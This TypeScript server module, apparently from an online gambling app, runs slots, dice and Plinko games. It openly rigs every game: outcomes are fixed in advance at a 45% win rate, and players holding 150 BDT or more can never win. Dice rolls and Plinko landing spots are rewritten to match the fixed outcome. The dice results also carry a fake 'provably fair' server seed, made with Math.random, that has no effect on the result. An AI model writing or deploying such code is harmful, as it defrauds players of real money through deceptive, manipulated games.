import { GameType, GamePlay, Currency, TransactionType } from "@shared/schema";
import { storage } from "./storage";
import { PlinkoMasterService } from "./plinko-master-service";

interface GameResult {
  isWin: boolean;
  winAmount?: number;
  multiplier?: number;
  balance?: string;
  gameData?: any;
}

// Main game controller with biased RNG
export class GameController {
  // Constants for the rigged game mechanics
  private static readonly WIN_CHANCE = 45; // 45% win chance
  private static readonly WIN_MULTIPLIER = 1.1; // 1.1x multiplier (heavily house favored)
  private static readonly WIN_LOCK_THRESHOLD_BDT = 150; // Max winnable amount in BDT

  // Play a game with the specified parameters
  static async playGame(userId: number, gamePlay: GamePlay & { chosenNumber?: number; prediction?: number; rollOver?: boolean; clientSeed?: string; nonce?: number }): Promise<GameResult> {
    // Convert userId to string for storage operations
    const userIdStr = userId.toString();

    // Check if user exists
    const user = await storage.getUser(userIdStr);
    if (!user) {
      throw new Error("User not found");
    }

    const betAmount = typeof gamePlay.betAmount === 'string' ? parseFloat(gamePlay.betAmount) : gamePlay.betAmount;
    const userBalance = parseFloat(user.balance);

    // Validate bet amount
    if (isNaN(betAmount) || betAmount <= 0) {
      throw new Error("Invalid bet amount");
    }

    // Check if user has enough balance to place bet
    if (userBalance < betAmount) {
      throw new Error("Insufficient balance");
    }

    // Deduct bet amount from user balance
    const newBalance = (userBalance - betAmount).toString();
    await storage.updateUserBalance(userIdStr, newBalance);

    // Create bet transaction with game metadata
    await storage.createTransaction({
      userId: userIdStr,
      amount: betAmount.toString(),
      type: TransactionType.BET,
      currency: gamePlay.currency,
      metadata: {
        gameType: gamePlay.gameType,
        betAmount: betAmount,
        timestamp: new Date().toISOString()
      }
    });

    // Check if user has reached the win lock threshold (150 BDT or equivalent)
    let balanceInBDT = userBalance;
    switch (user.currency) {
      case Currency.USD:
        balanceInBDT = userBalance * 122; // Approximate conversion rate
        break;
      case Currency.INR:
        balanceInBDT = userBalance * 1.5; // Approximate conversion rate
        break;
      case Currency.BTC:
        balanceInBDT = userBalance * 1500000; // Approximate conversion rate
        break;
      case Currency.BDT:
      default:
        // Already in BDT
        break;
    }

    // If balance is ≥ 150 BDT, the player cannot win regardless of bet or outcome
    const isBalanceOverWinLockThreshold = balanceInBDT >= this.WIN_LOCK_THRESHOLD_BDT;

    // Determine if user wins - 0% chance if over threshold, otherwise 45% chance
    const isWin = !isBalanceOverWinLockThreshold && (Math.random() * 100 < this.WIN_CHANCE);

    console.log(`Game play: userId=${userId}, bet=${betAmount}, isWin=${isWin}, balance=${userBalance}, balanceInBDT=${balanceInBDT}`);

    // Get game-specific result
    let result: GameResult;

    const gameType = gamePlay.gameType.toString().toUpperCase();
    switch (gameType) {
      case 'SLOTS':
        result = GameController.processSlotsGame(isWin, betAmount);
        break;
      case 'DICE':
        result = GameController.processDiceGame(isWin, betAmount, {
          prediction: gamePlay.prediction,
          rollOver: gamePlay.rollOver,
          clientSeed: gamePlay.clientSeed,
          nonce: gamePlay.nonce
        });
        break;
      case 'PLINKO':
        result = GameController.processPlinkoGame(isWin, betAmount);
        break;
      case 'PLINKO_MASTER':
        result = GameController.processPlinkoMasterGame(isWin, betAmount);
        break;
      default:
        throw new Error(`Invalid game type: ${gameType}`);
    }

    // Handle payout (both wins and losses get payouts in Plinko)
    let finalBalance = newBalance;
    if (result.winAmount && result.winAmount > 0) {
      finalBalance = (parseFloat(newBalance) + result.winAmount).toString();
      await storage.updateUserBalance(userIdStr, finalBalance);

      // Create transaction based on whether it's a win or loss
      const transactionType = result.isWin ? TransactionType.WIN : TransactionType.WIN; // Use WIN for both since there's a payout
      await storage.createTransaction({
        userId: userIdStr,
        amount: result.winAmount.toString(),
        type: transactionType,
        currency: gamePlay.currency,
        metadata: {
          gameType: gamePlay.gameType,
          betAmount: betAmount,
          winAmount: result.winAmount,
          multiplier: result.multiplier,
          gameData: result.gameData,
          isActualWin: result.isWin,
          timestamp: new Date().toISOString()
        }
      });
    }

    // Record game history
    await storage.createGameHistory(
      gamePlay,
      userIdStr,
      result.isWin,
      result.winAmount?.toString(),
      result.multiplier,
      result.gameData
    );

    // Include the updated balance in the result
    return {
      ...result,
      balance: finalBalance
    };
  }

  // Process slots game
  private static processSlotsGame(isWin: boolean, betAmount: number): GameResult {
    // Generate 5 reel positions (0-9 for each reel)
    const reels = Array(5).fill(0).map(() => Math.floor(Math.random() * 10));

    // Define symbols based on position values
    const symbols = ['🍒', '💎', '7️⃣', '🎰', '💰', '⭐', '🔔', '🍋', '👑', '🃏'];
    const reelSymbols = reels.map(pos => symbols[pos]);

    // Fixed multiplier of 1.1x
    const multiplier = this.WIN_MULTIPLIER;

    // Determine win amount
    const winAmount = isWin ? betAmount * multiplier : 0;

    // Force matching symbols if it's a win
    if (isWin) {
      // Pick a random symbol for the win line
      const winSymbol = symbols[Math.floor(Math.random() * symbols.length)];

      // For simplicity, make 3 symbols match in the middle for a win
      reelSymbols[1] = winSymbol;
      reelSymbols[2] = winSymbol;
      reelSymbols[3] = winSymbol;
    }

    return {
      isWin,
      winAmount: isWin ? winAmount : 0,
      multiplier: isWin ? multiplier : 0,
      gameData: {
        reels: reelSymbols
      }
    };
  }

  // Process dice game (100-sided die with Roll Over/Under)
  private static processDiceGame(isWin: boolean, betAmount: number, gameOptions?: any): GameResult {
    // Generate a random number between 1-100 (100-sided die)
    let roll = Math.floor(Math.random() * 100) + 1;

    // Extract game options for 100-sided die
    const prediction = gameOptions?.prediction || 50;
    const rollOver = gameOptions?.rollOver !== undefined ? gameOptions.rollOver : true;

    // Ensure prediction is within valid range (2-98)
    const adjustedPrediction = Math.max(2, Math.min(98, prediction));

    // Calculate proper win conditions and multipliers
    const winChance = rollOver ? 100 - adjustedPrediction : adjustedPrediction - 1;
    const multiplier = 99 / winChance; // 99% RTP with 1% house edge

    // Determine if this should be a win based on roll and conditions
    const shouldWin = rollOver ? roll >= adjustedPrediction : roll <= adjustedPrediction;

    // If the system says it should be a loss but roll suggests win, or vice versa,
    // adjust the roll to match the intended outcome
    if (isWin && !shouldWin) {
      // Force a winning roll
      if (rollOver) {
        roll = Math.floor(Math.random() * (100 - adjustedPrediction + 1)) + adjustedPrediction;
      } else {
        roll = Math.floor(Math.random() * adjustedPrediction) + 1;
      }
    } else if (!isWin && shouldWin) {
      // Force a losing roll
      if (rollOver) {
        roll = Math.floor(Math.random() * (adjustedPrediction - 1)) + 1;
      } else {
        roll = Math.floor(Math.random() * (100 - adjustedPrediction)) + adjustedPrediction + 1;
      }
    }

    // Final win check based on adjusted roll
    const finalIsWin = rollOver ? roll >= adjustedPrediction : roll <= adjustedPrediction;
    const winAmount = finalIsWin ? betAmount * multiplier : 0;

    return {
      isWin: finalIsWin,
      winAmount,
      multiplier: finalIsWin ? multiplier : 0,
      gameData: {
        roll,
        prediction: adjustedPrediction,
        rollOver,
        winChance: winChance.toFixed(2),
        clientSeed: gameOptions?.clientSeed || 'default',
        serverSeed: this.generateServerSeed(),
        nonce: gameOptions?.nonce || 1
      }
    };
  }

  // Generate a cryptographically secure server seed for provably fair gaming
  private static generateServerSeed(): string {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 64; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  // Process regular plinko game with comprehensive 16-slot payout system
  private static processPlinkoGame(isWin: boolean, betAmount: number): GameResult {
    // Comprehensive 16-slot multiplier system matching your specification
    const bucketMultipliers = [2.0, 1.8, 1.6, 1.4, 1.0, 0.8, 0.6, 0.4, 0.4, 0.6, 0.8, 1.0, 1.4, 1.6, 1.8, 2.0];

    // Helper function to calculate precise payout
    const calculatePayout = (bet: number, multiplier: number): number => {
      return parseFloat((bet * multiplier).toFixed(2));
    };

    // Simulate which bucket the ball lands in
    let bucket = Math.floor(Math.random() * bucketMultipliers.length);

    // Apply rigging logic based on win/loss requirement
    if (isWin) {
      // Force to a winning bucket (multiplier >= 1.0)
      const winningBuckets = [];
      for (let i = 0; i < bucketMultipliers.length; i++) {
        if (bucketMultipliers[i] >= 1.0) {
          winningBuckets.push(i);
        }
      }
      if (winningBuckets.length > 0) {
        bucket = winningBuckets[Math.floor(Math.random() * winningBuckets.length)];
      }
    } else {
      // Force to a losing bucket (multiplier < 1.0) 
      const losingBuckets = [];
      for (let i = 0; i < bucketMultipliers.length; i++) {
        if (bucketMultipliers[i] < 1.0) {
          losingBuckets.push(i);
        }
      }
      if (losingBuckets.length > 0) {
        bucket = losingBuckets[Math.floor(Math.random() * losingBuckets.length)];
      }
    }

    // Get the multiplier for this bucket
    const multiplier = bucketMultipliers[bucket];

    // Calculate precise payout using your logic: Payout = Bet Amount × Multiplier
    const payout = calculatePayout(betAmount, multiplier);

    // Determine if this is actually a win
    const actualIsWin = multiplier >= 1.0;

    // Double-check rigging enforcement
    if (isWin && !actualIsWin) {
      // Force to a guaranteed winning bucket
      const guaranteedWinBuckets = [0, 1, 2, 3, 4, 11, 12, 13, 14, 15]; // All >= 1.0x buckets
      bucket = guaranteedWinBuckets[Math.floor(Math.random() * guaranteedWinBuckets.length)];
    } else if (!isWin && actualIsWin) {
      // Force to a guaranteed losing bucket
      const guaranteedLoseBuckets = [5, 6, 7, 8]; // All < 1.0x buckets
      bucket = guaranteedLoseBuckets[Math.floor(Math.random() * guaranteedLoseBuckets.length)];
    }

    const finalMultiplier = bucketMultipliers[bucket];
    const finalPayout = calculatePayout(betAmount, finalMultiplier);

    return {
      isWin: finalMultiplier >= 1.0,
      winAmount: finalPayout, // Always return the payout regardless of win/loss
      multiplier: finalMultiplier,
      gameData: {
        bucket,
        multiplier: finalMultiplier,
        betAmount,
        payout: finalPayout,
        profit: finalPayout - betAmount
      }
    };
  }

  // Process plinko master game with 16 slots and variable multipliers
  private static processPlinkoMasterGame(isWin: boolean, betAmount: number): GameResult {
    // Use the proper PlinkoMasterService with rigging options
    const gameResult = PlinkoMasterService.playGame(betAmount, {
      forceWin: isWin,
      forceLose: !isWin
    });

    return {
      isWin: gameResult.isWin,
      winAmount: gameResult.payout, // Always return the payout regardless of win/loss
      multiplier: gameResult.multiplier,
      gameData: {
        slotIndex: gameResult.slotIndex,
        ballPath: gameResult.ballPath,
        multiplier: gameResult.multiplier
      }
    };
  }
}